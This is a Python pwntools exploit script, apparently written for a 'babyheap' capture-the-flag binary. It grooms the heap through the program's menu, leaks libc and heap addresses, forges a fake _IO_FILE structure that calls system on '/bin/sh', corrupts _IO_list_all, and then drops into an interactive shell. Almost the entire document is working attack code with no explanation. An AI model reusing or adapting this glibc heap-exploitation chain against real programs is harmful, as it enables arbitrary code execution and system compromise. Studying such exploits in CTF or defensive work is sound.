#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = ''
port = 0

binary = "./babyheap"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")




def create(size,data):
  r.recvuntil(":")
  r.sendline("1")
  r.recvuntil(":")
  r.sendline(str(size))
  r.recvuntil(":")
  r.send(data)
  pass

def delete(index):
  r.recvuntil(":")
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(index))
  pass

def show(index,start,end):
  r.recvuntil(":")
  r.sendline("3")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = process([binary, "0"])

else:
  r = remote(host ,port)

if __name__ == '__main__':
  create(0x18,"A")
  create(0x3ff,"A")
  create(0x18,"A")
  delete(1)
  delete(0)
  create(0x18,"A"*0x18)
  create(0x18,"A")
  create(0x18,"A")
  delete(1)
  delete(2)
  for i in xrange(0x17):
    create(0x18,"A")

  
  create(0xd8,"A")
  create(0x18,"A")
  create(0x18,"A")
  create(0x18,"A")
  create(0x18,"A")
  create(0x18,"A")
  delete(27)
  
  show(3,"","")
  libc.address = u64(r.recv(6).ljust(8,"\x00")) - 0x387b58
  print "libc =", hex(libc.address)
  delete(29)
  show(2,"","")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x40
  print "heap =", hex(heap)
  delete(30)
  delete(28)


  create(0x18,"A")
  create(0x18,"A")
  create(0x18,"A")
  create(0x3ff,"A")

  create(0x18,"A"*8 + "\x31")
  for i in xrange(0x20-7-6):
    create(0x18,"A"*8 + "\x31")
  fake = ("\x00"*1 + "A"*0x17 + p64(0x3e1)) + ("A"*0x18 + p64(0x3e1))*0x11
  fuck = fake[::-1]
  index_last = 0
  while 1:
    index = fuck.find("\x00",index_last)
    #print index
    index_last = fuck.find("\x00",index+1)
    delete(30)
    payload = "A"*(len(fake)-index_last) + fake[len(fake)-index_last:len(fake)-index-1]
    #print len(payload)
    #print repr(payload)
    create(0x3ff,payload)
    if index_last == (len(fuck)-1):
      break


  IO_str_table = libc.address + 0x384500
  _IO_FILE_base = heap + 0x2e0
  #binsh = libc.search("/bin/sh\x00").next()
  binsh = libc.search("/bin/sh\x00").next()+5
  print hex(libc.search("/bin/sh\x00").next())
  _wide_data = _IO_FILE_base + 0x20
  _IO_FILE = ( p64(0xdadaddaaddddaaaa)*2 +
               p64(0) +
               p64(0x7fffffffffffffff) +
               p64(0xdadaddaaddddaaaa) +
               p64(0) +
               p64((binsh - 100) / 2) +
               p64(0xdadaddaaddddaaaa)*11 +
               p64(_wide_data) +
               p64(0xdadaddaaddddaaaa)*6 +
               p64(IO_str_table) +
               p64(libc.symbols['system']))


  fuck = _IO_FILE[::-1]
  index_last = 0
  while 1:
    index = fuck.find("\x00",index_last)
    #print index
    index_last = fuck.find("\x00",index+1)
    delete(22)
    payload = "A"*(len(_IO_FILE)-index_last) + _IO_FILE[len(_IO_FILE)-index_last:len(_IO_FILE)-index-1]
    #print len(payload)
    #print repr(payload)
    create(0x3d0,payload)
    if index_last == (len(fuck)-0x11):
      break

  delete(22)
  create(0x3d0,_IO_FILE[:0x10])



  for i in xrange(0x10):
    delete(21-i)
  delete(22)
  payload = "A"*0x28 + p64(libc.symbols["__GI__IO_list_all"]-0x10)
  create(0x3d0, payload)
  fuck = _IO_FILE[::-1]
  index_last = 0
  for i in xrange(0x6):
    create(0x3d0,"A"*(0x18+(i+1)*0x20) + "A"*(7-i))
  create(0x3d0,"A"*(0x18+(i+1+1)*0x20) + "\x61")
  for j in xrange(0x8):
    create(0x3d0,"A"*(0x10+(i+1+1+1+j)*0x20) +  "A"*(7-j))
  r.recvuntil(":")
  r.sendline("1")
  r.recvuntil(":")
  r.sendline("12")
    
  r.interactive()

